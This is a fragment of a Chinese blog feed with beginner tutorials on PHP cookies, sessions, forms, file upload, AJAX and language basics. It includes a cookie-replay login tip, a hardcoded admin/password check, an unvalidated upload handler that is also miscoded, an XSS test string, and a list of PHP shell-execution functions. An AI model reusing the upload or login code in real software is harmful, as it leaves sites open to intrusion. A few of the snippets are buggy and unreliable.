GMT</code>回送http响应，当浏览器获取到该消息后，就会保存该Cookie的信息到本地磁盘。</li><li>如果没有时间（第三个参数），Cookie不会保存到客户端，当浏览器会话结束，Cookie会消失。</li><li>Cookie保存的是字符串信息</li><li>客户端可以保存多个key=&gt;val，Cookie可以有多个key=&gt;val，可以给不同的键值，制定不同的有效时间</li><li>Cookie在保存过程中，会对中文进行urlencode编码</li></ol><p><strong>tip</strong><br>浏览器A已登录，存有Cookie；浏览器B未登陆，但若获取A的Cookie进行身份认证，则可不用账号密码也可实现登陆</p><hr><h4 id="简单代码使用"><a href="#简单代码使用" class="headerlink" title="简单代码使用"></a>简单代码使用</h4><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">'name'</span>] == <span class="hljs-string">'admin'</span> &amp;&amp; $_POST[<span class="hljs-string">'password'</span>] == <span class="hljs-string">'password'</span>) &#123;<br>$value = <span class="hljs-string">"my cookie value"</span>;<br>setcookie(<span class="hljs-string">"loginString"</span>, $value);<br><span class="hljs-comment">// setcookie("loginString", $value, 0, "/", "localhost", false, false);</span><br>header(<span class="hljs-string">"Location:http://localhost/cookie/view.php"</span>);<br><span class="hljs-comment">//echo "login ok";</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="注销逻辑"><a href="#注销逻辑" class="headerlink" title="注销逻辑"></a>注销逻辑</h4><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">setcookie(&quot;loginString&quot;, $value, time() - 60 * 60);  // 使过期<br>setcookie(&quot;loginString&quot;,&quot;&quot;);  // 置空<br></code></pre></td></tr></table></figure><hr><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p><strong>存放</strong>：服务器端，防篡改。即使禁用Cookie，Session依然可以确定个人信息</p><hr><h2 id="表单处理"><a href="#表单处理" class="headerlink" title="表单处理"></a>表单处理</h2><p>前段通过一个<code>Form</code>表单来提交数据。可指定提交方式为<code>GET</code>或<code>POST</code>，在后台通过<code>$_GET</code>或者<code>$_POST</code>超全局数组来接收。</p><h3 id="前端HTML页面"><a href="#前端HTML页面" class="headerlink" title="前端HTML页面"></a>前端HTML页面</h3><p>简单实现<br><figure class="hljs highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><br>            login<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span> = <span class="hljs-string">"login.php"</span>, <span class="hljs-attr">method</span> = <span class="hljs-string">"post"</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span> = <span class="hljs-string">"text"</span> <span class="hljs-attr">name</span> = <span class="hljs-string">"name"</span> /&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span> = <span class="hljs-string">"text"</span> <span class="hljs-attr">name</span> = <span class="hljs-string">"password"</span> /&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span> = <span class="hljs-string">"submit"</span> <span class="hljs-attr">name</span> = <span class="hljs-string">"submit"</span> /&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure></p><h3 id="后端PHP页面"><a href="#后端PHP页面" class="headerlink" title="后端PHP页面"></a>后端PHP页面</h3><p>简单实现<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">'name'</span>] == <span class="hljs-string">'admin'</span> <span class="hljs-keyword">and</span> $_POST[<span class="hljs-string">'password'</span>] == <span class="hljs-string">'password'</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">"login ok"</span>;<br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><hr><h3 id="文件上传代码实现"><a href="#文件上传代码实现" class="headerlink" title="文件上传代码实现"></a>文件上传代码实现</h3><figure class="hljs highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">"multipart/form-data"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span>&gt;</span><br><span class="hljs-comment">&lt;!-- MAX_FILE_SIZE must precede the file input filed --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"MAX_FILE_SIZE"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"30000"</span> /&gt;</span><br><span class="hljs-comment">&lt;!-- Name of input element determines name in $_FILES array --&gt;</span><br>Send this file:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"userfile"</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> $_FILES[<span class="hljs-string">'userfile'</span>][<span class="hljs-string">'name'</span>].<span class="hljs-string">"&lt;br&gt;"</span>;<br>    <span class="hljs-keyword">echo</span> $_FILES[<span class="hljs-string">'userfile'</span>][<span class="hljs-string">'size'</span>].<span class="hljs-string">"&lt;br&gt;"</span>;<br>    <span class="hljs-keyword">echo</span> $_FILES[<span class="hljs-string">'userfile'</span>][<span class="hljs-string">'type'</span>].<span class="hljs-string">"&lt;br&gt;"</span>;<br>    <span class="hljs-keyword">echo</span> $_FILES[<span class="hljs-string">'userfile'</span>][<span class="hljs-string">'tmp_name'</span>].<span class="hljs-string">"&lt;br&gt;"</span>;<br><br>    var_dump($_FILES[<span class="hljs-string">'userfile'</span>][<span class="hljs-string">'error'</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;<br>    var_dump(move_uploaded_file($_FILES[<span class="hljs-string">'userfile'</span>][<span class="hljs-string">'tmp_name'</span>], <span class="hljs-string">"./"</span>, $_FILES[<span class="hljs-string">'userfile'</span>][<span class="hljs-string">'name'</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><hr><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="AJAX技术"><a href="#AJAX技术" class="headerlink" title="AJAX技术"></a>AJAX技术</h3><blockquote><p>ajax技术，关键是一个异步刷新。通过ajax代码与后台发生数据交换，不必刷新URL，即可实现页面的显示变化。<br>在与后台交互数据时，关键点：要<code>new</code>一个能够网络通讯的<code>http</code>请求类，但是根据不同的浏览器，会有不同的<code>new</code>方法，这也叫做浏览器兼容适配</p></blockquote><p>非<code>IE6</code>浏览器：<br><figure class="hljs highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">var</span> oAjax = <span class="hljs-keyword">new</span> XMLHttpRequest();<br></code></pre></td></tr></table></figure></p><p><code>IE6</code>浏览器：<br><figure class="hljs highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">var</span> oAjax = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">'Microsoft.XMLHTTP'</span>);<br></code></pre></td></tr></table></figure></p><p><code>new</code>出来的网络请求的实体类，之后，就可通过设置<code>GET</code>或<code>POST</code>方式打开<code>URL</code>连接的方式来发送数据并得到返回值</p><figure class="hljs highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">oAjax.open([OpenMethod], [url], [WaitOrNot])<br></code></pre></td></tr></table></figure><p>第三个参数为<code>true</code>或<code>false</code>，表示是否等待这个返回再继续执行<code>JS</code>代码，一般置为<code>true</code>，若为<code>GET</code>方式，直接将参数拼接到<code>url</code>上即可；若为<code>POST</code>方式，稍有不同，关键在<code>send</code>函数的参数不同<br><figure class="hljs highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">var</span> url = <span class="hljs-string">"ajax.php"</span>; <br><span class="hljs-keyword">var</span> postStr = <span class="hljs-string">"hehe"</span> + sValue;<br>oAjax.open(<span class="hljs-string">'post'</span>, url, <span class="hljs-keyword">true</span>);<br>oAjax.setRequestHeader(<span class="hljs-string">"Content-Type"</span>, <span class="hljs-string">"application/x-www-form-urlencoded"</span>);<br><span class="hljs-comment">//oAjax.send(postStr);  // 若为GET方式，直接使用send()即可</span><br></code></pre></td></tr></table></figure></p><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p><a href="http://cn2.php.net/manual/zh/wrappers.php.php#refsect2-wrappers.php-unknown-descriptioo" target="_blank" rel="noopener"><strong>PHP官方文档</strong></a><br><a href="https://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&amp;fps=1" target="_blank" rel="noopener"><strong>CSDN博客</strong></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> B/S </tag>
            
            <tag> Cookie </tag>
            
            <tag> Session </tag>
            
            <tag> Form </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP入门基础</title>
      <link href="/2018/12/15/Php_basic/"/>
      <url>/2018/12/15/Php_basic/</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>本文主要为基础入门做个引子，对常见的或者常用的知识做个简介，方便自己和他人查阅。</p><p><strong>注：补充知识放在文末</strong></p><hr><h3 id="Sublime配置"><a href="#Sublime配置" class="headerlink" title="Sublime配置"></a>Sublime配置</h3><blockquote><p>OS: windows 10</p></blockquote><p><a href="http://www.sublimetext.com/" target="_blank" rel="noopener">Sublime官网</a><br>这里选择windows版下载安装。<br>步骤如下：</p><ol><li>打开Sublime编辑器，输入如下代码：<figure class="hljs highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">&#123;<br>    <span class="hljs-string">"cmd"</span>: [<span class="hljs-string">"php"</span>, <span class="hljs-string">"$file"</span>],<br>    <span class="hljs-string">"file_regex"</span>: <span class="hljs-string">"php$"</span>,<br>    <span class="hljs-string">"selector"</span>: <span class="hljs-string">"source.php"</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>一般保存至默认路径即可，如若默认路径有变，则手动选择如下路径：<br><code>C:\User(用户)\{YourName}\AppData\Roaming\Sublime Text3\Packages\User\</code></p><ol start="2"><li>添加PHP环境变量：<br>在<a href="http://phpstudy.php.cn/" target="_blank" rel="noopener">phpStudy安装</a>目录中，找到php目录下你想使用的对应php版本，比如这里我选择php-7.0.12-nts。<br>进入文件夹，复制路径。</li></ol><p>打开系统环境变量添加所复制的路径，这里我使用如下方法：</p><blockquote><p>右击计算机–&gt;属性–&gt;高级系统设置–&gt;环境变量–&gt;系统变量</p></blockquote><p>找到变量Path，编辑并新建值，复制php路径，确认并退出。</p><ol start="3"><li><p>在Sublime编辑器选项卡中依次打开：<br><code>Tools--&gt;Build System--&gt;php</code><br>这里会出现<code>php</code>选项，是由于第一步文件的配置以及第二步环境变量配置均无误，否则将不会出现这个选项。</p></li><li><p>配置完成<br>快捷键：<code>Ctrl + b</code>即可输出显示php被解释后的运行结果。</p></li></ol><hr><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><h4 id="定义与概念"><a href="#定义与概念" class="headerlink" title="定义与概念"></a>定义与概念</h4><ul><li>PHP是嵌入HTML页面中的脚本语言</li><li>是目前最流行的网站开发语言</li><li>在几乎所有的平台中都可以运行</li><li>很多的企业都在使用PHP作为开发语言</li></ul><hr><h4 id="基础规范"><a href="#基础规范" class="headerlink" title="基础规范"></a>基础规范</h4><blockquote><ol><li>PHP脚本以<code>&lt;?php</code>开始，以<code>?&gt;</code>结束为规范写法。若为最后一行，可以省略<code>?&gt;</code></li><li>PHP 脚本可以单独存在，也可以与html页面结合</li><li>php文件扩展名规范，一般是<code>.php</code>结尾。但是，也可以使用其他命名，如<code>.phtml</code>等，具体是定义在配置文件中的。</li></ol></blockquote><hr><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><blockquote><p>布尔类型<code>（bool）</code><br>整型<code>（int）</code><br>浮点型<code>（float）</code><br>字符串<code>（string)</code><br>资源<code>（resource）</code><br>空类型<code>（NULL）</code><br>数组<code>（array）</code><br>对象<code>（class）</code></p></blockquote><p>一般可使用<code>var_dump()</code>来查看类型</p><h4 id="变量与常量"><a href="#变量与常量" class="headerlink" title="变量与常量"></a>变量与常量</h4><p>常量：</p><blockquote><p>一旦赋值不会改变，且应尽量使用大写。<br>常量分为系统常量和自定义常量。<br>系统常量可以理解为值不会有改变的量</p></blockquote><p>定义常量</p><blockquote><p>使用PHP中的函数<code>define()</code>定义自定义常量<br>常量在使用时，不需要<code>$</code>符号<br>常用定义：<code>Define(&#39;ROOT&#39;,&#39;localhost&#39;);</code></p></blockquote><p>常用系统常量：</p><blockquote><p><code>__FILE__</code>：php程序文件名/绝对路径<br><code>__DIR__</code>：被调用的文件脚本所在目录<br><code>__FUNCTION__</code>：函数名<br><code>__LINE__</code>：PHP程序文件行数<br><code>PHP_VERSION</code>：当前解析器的版本号<br><code>PHP_OS</code>：执行当前PHP版本的操作系统名称</p></blockquote><hr><p>变量：</p><blockquote><p>变量以<code>$</code>符开始，后面跟着变量名称<br>变量必须以字母或下划线字符开始、只能包含字母数字字符以及下划线（A-z、0-9和_）<br>变量名不能包含空格，且区分大小写。</p></blockquote><hr><h4 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h4><p>输出：<br><code>echo、print、printf、sprintf、print_r、die、var_dump</code></p><p>输入：<br>cli命令行模式接收参数：三种方式</p><blockquote><p>使用argv数组、使用getopt方法、提示用户输入</p></blockquote><p>argv：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**<br> * 使用 $argc $argv 接受参数<br> */</span><br> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">"接收到&#123;$argc&#125;个参数"</span>;<br>print_r($argv);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><p>getopt:<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**<br> * 使用 getopt函数<br> */</span><br> <br>$param_arr = getopt(<span class="hljs-string">'a:b:'</span>);<br>print_r($param_arr);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><p>提示用户输入：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**<br> * 提示用户输入，类似Python<br> */</span><br>fwrite(STDOUT,<span class="hljs-string">'请输入您的博客名：'</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">'您输入的信息是：'</span>.fgets(STDIN);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><h4 id="EOF"><a href="#EOF" class="headerlink" title="EOF"></a>EOF</h4><p>PHP EOF(heredoc)是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字串的方法。</p><p>使用概述：</p><blockquote><ol><li>必须后接分号，否则编译不通过</li><li>EOF可以用任意其它字符代替，只需保证结束标识与开始标识一致</li><li>结束标识必须顶格独自占一行，前后不能衔接任何空白字符</li><li>开始标识可以不单引号或双引号，不带引号与带双引号效果一致，均解释内嵌的变量和转义符号，但带单引号则不解释。</li><li>当内容需要内嵌引号（单、双引号）时，不需要加转义符，本身对单双引号转义。</li></ol></blockquote><hr><h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><p>比较运算符：</p><blockquote><p>大于、小于、等于等运算，它们的结果都是bool值类型</p></blockquote><p>逻辑运算符：</p><blockquote><p>与或非运算<br>and或&amp;&amp;    or或||    not或!<br>它们的结果都是bool值</p></blockquote><hr><h4 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h4><blockquote><p><code>.</code>拼接运算符<br>长度计算：<br><code>strlen()、mb_strlen()</code>都可以用来计算字符串长度，区别在于<code>mb_strlen</code>可以计算中文字符串长度<br><code>addslashes()</code>将预定义的字符添加反斜杠转义,即<br><code>bin2hex()</code>将<code>ascii</code>字符串转换为16进制<br><code>chop()</code>移除字符串右侧的空白字符或其他字符，这些字符需要自己指定的，默认则为空白字符<br><code>chr()</code> 将指定的ascii值转换成字符<br><code>crypt()</code>对字符串单项加密，不可逆转，类似于做md5值<br><code>htmlentities()</code> 将字符串转换为html实体<br><code>echo htmlentities(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);</code>用于防御XSS攻击<br><code>implode()</code>返回一个由数组元素组合成的字符串，与<code>explode()</code>相反作用<br><code>md5()</code>计算字符串的md5值<br><code>md5_file()</code>计算文件的md5值<br><code>str_replace()</code>替换字符串中的一部分（大小写敏感）<br><code>str_ireplace()</code> 同上（大小写不敏感）<br><code>str_split()</code> 把字符串分割到数组中，php4\5\7均支持，但无法按照指定的字符来做分割<br><code>split()</code> 按照指定的字符来分割，与<code>explode</code>用法相似，<code>split</code>函数仅可在php4\5中使用，PHP7废除了此用法<br><code>strcmp</code> 比较两个字符串（大小写敏感）</p></blockquote><blockquote><p><strong>php的单双引号都能输出字符串，但双引号中的$可以传值，但在单引号中不行。</strong></p></blockquote><hr><h4 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h4><blockquote><ol><li>强制型：（数据类型）数据变量<br><code>(int)$var  (string)$var  (float)$var  (bool)$var</code></li><li>使用具体类型函数转换：<br><code>intval()  floatval()  strval()</code></li><li>使用通用类型转换函数：<br><code>settype(mixed var, string)</code></li></ol></blockquote><p>一些例子：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">var_dump((int)$b);<br>var_dump((int)str_replace(<span class="hljs-string">"1"</span>, <span class="hljs-string">""</span>, $a));<br></code></pre></td></tr></table></figure></p><hr><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>定义：</p><blockquote><p>数组是特殊的变量，可以在单个变量中同时保存一个或一个以上的值，并且可以通过下标来访问其中的某一个值。在PHP中，用array()函数创建数组。同时在php中数组可以存储任意类型的数据。<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined">$arr = array(&apos;我是&apos;, &apos;一个&apos;, &apos;数组&apos;);<br></code></pre></td></tr></table></figure></p></blockquote><hr><h5 id="数组分类"><a href="#数组分类" class="headerlink" title="数组分类"></a>数组分类</h5><p>PHP中数组一般分为索引数组和关联数组。第三种叫多维度数组。</p><p>定义：<br>索引数组是指数组的建是整数的数组，并且键的整数顺序是从0开始的，并依次递增。</p><hr><h5 id="三种赋值方式："><a href="#三种赋值方式：" class="headerlink" title="三种赋值方式："></a>三种赋值方式：</h5><blockquote><ol><li>用数组变量的名字后面加一个中括号的方式赋值。而且中括号内的键一定要是整数。例如：<br><code>$a[1] = 0;</code></li><li>用<code>array()</code>创建一个空数组，使用<code>=&gt;</code>分隔左侧键和右侧值。且键一定为整数。</li><li>用array()创建一个空数组，直接在数组里用英文的单引号或双引号赋值，数组会默认建立从<code>0</code>开始的整数的键。</li></ol></blockquote><hr><h5 id="访问关联数组的内容"><a href="#访问关联数组的内容" class="headerlink" title="访问关联数组的内容"></a>访问关联数组的内容</h5><blockquote><ol><li>直接使用键来输出：<figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">$score = <span class="hljs-keyword">array</span>(<span class="hljs-string">"Math"</span> =&gt; <span class="hljs-string">"数学"</span>);<br>$scoreMaths = $score[<span class="hljs-string">"Maths"</span>];<br></code></pre></td></tr></table></figure></li></ol></blockquote><ol start="2"><li>使用foreach输出：<figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>($project <span class="hljs-keyword">as</span> $k =&gt; $z) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br /&gt;"</span>;<br>    <span class="hljs-keyword">echo</span> $k.<span class="hljs-string">"是"</span>.$z.<span class="hljs-string">"。 "</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><hr><h5 id="操作技巧"><a href="#操作技巧" class="headerlink" title="操作技巧"></a>操作技巧</h5><blockquote><ul><li>获取数组长度，<code>count()</code>和<code>sizeof</code>统计数组下标个数</li><li><code>each()</code> 返回当前元素的键名和键值，并将内部指针向前移动。</li><li><code>list()</code> 用于在一次操作中给一组变量赋值</li><li>数组元素的排序：<blockquote><p><code>sort()</code>、<code>asort()</code>和<code>ksort()</code>都是正向排序，<code>rsort</code>、<code>arsort()</code>、<code>krsort()</code>都是反向排序</p></blockquote></li><li><code>array_count_values()</code>统计数组内下标值得个数</li><li><code>current()</code> 每个数组都有一个内部指针指向他的当前单元，初始指向插入到数组中的第一个元素</li><li><code>array_pad()</code> 数组首位选择性追加</li><li><code>unset()</code> 用于销毁指定的<strong>变量</strong></li><li><code>array_fill()</code> 用键值填充数组</li><li><code>array_splice()</code> 删除数组成员</li><li><code>array_unique()</code> 删除数组中的重复值</li><li><code>array_flip()</code> 交换数组的键值和值</li><li><code>array_search()</code> 搜索数组</li><li><code>array_combine()</code> 通过合并两个数组来创建一个新数组，其中的一个数组元素为键名，另一个数组元素为键值</li></ul></blockquote><hr><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><h5 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h5><p>定义：</p><blockquote><p>参数就是通过参数列表可以传递信息到函数（以逗号作为分隔符）的表达式列表。参数类似于一个变量，通过传递参数可以使函数实现对参数的运算。</p></blockquote><p>参数可以是任意类型的数据，具体要根据函数功能来确定。例如：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">square</span><span class="hljs-params">($a)</span> </span>&#123;<br>    <span class="hljs-keyword">echo</span> $a * $a;<br>&#125;<br>    square(<span class="hljs-number">2</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><hr><h5 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h5><p>PHP语言自带许多函数，常见的有：</p><blockquote><p><code>isset()</code> 判断变量是否存在<br><code>strlen()</code> 计算字符串长度<br><code>var_dump()</code> 输出变量类型和具体内容（常用于调试）<br><code>mysql_connect()</code> 链接数据库<br><code>function_exists()</code> 判断函数是否存在</p></blockquote><hr><h5 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h5><p>编写一个函数，对数组实现<code>array_flip()</code>操作，返回一个新的数组：</p><hr><h4 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><blockquote><p>（OOP）Object-Oriented Programming 面向对象程序语言<br>对象是一个由信息及对信息进行处理的秒说所组成的整体，是对现实世界的抽象。</p></blockquote><p>类：</p><blockquote><p>定义了一件事物的抽象特点，类的定义包含了数据的形式以及对数据的操作</p></blockquote><p>对象：</p><blockquote><p>类的具体实际例子</p></blockquote><hr><h5 id="对象的主要三个特征"><a href="#对象的主要三个特征" class="headerlink" title="对象的主要三个特征"></a>对象的主要三个特征</h5><blockquote><p>对象的行为：可以对对象施加的操作。如：开灯，关灯<br>对象的形态：当施加那些方法时，对象如和响应。如：颜色、尺寸、外形<br>对象的表示：就相当于省份证，具体区分在相同的行为与状态下有何不同</p></blockquote><hr><h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><h5 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h5><blockquote><p><code>fread()</code> 读取指定长度的字符串<br><code>fgets()</code> 读取文件一行的内容<br><code>file_get_contents()</code> 读取文件内容<br><code>feof()</code> 检测文件指针是否已到达文件末尾</p></blockquote><p>读取文件全部内容:<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">fread($file, filesize($file));<br>file_get_contents($file);<br><span class="hljs-keyword">while</span> (!feof($file)) &#123;<br>fgets($file);<br>&#125;<br></code></pre></td></tr></table></figure></p><hr><h5 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h5><p><code>fwrite()</code> 写入数据</p><h5 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h5><p><code>fclose()</code> 关闭文件</p><hr><h5 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h5><blockquote><ul><li>获取文件大小：<code>filesize()</code></li><li>使用<code>is_readable</code>与<code>is_writeable</code>判断文件是否存在的基础上，是否可读或可写</li><li>使用<code>is_file</code>和<code>file_exists</code>判断指定路径是否存在某文件</li></ul></blockquote><hr><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><p><code>eval()</code>、<code>assert()</code></p><h5 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h5><blockquote><p><code>system()</code> 输出并返回最后一行shell结果<br><code>exec()</code> 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回数组里<br><code>passthru()</code> 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。<br><code>popen()</code>、<code>shell_exec()</code>、<code>proc_open()</code>、<code>pcntl_exec()</code> 反引号这个实际上使用的是<code>shell_exex</code></p></blockquote><h3 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h3><h4 id="解释性语言与编译型语言"><a href="#解释性语言与编译型语言" class="headerlink" 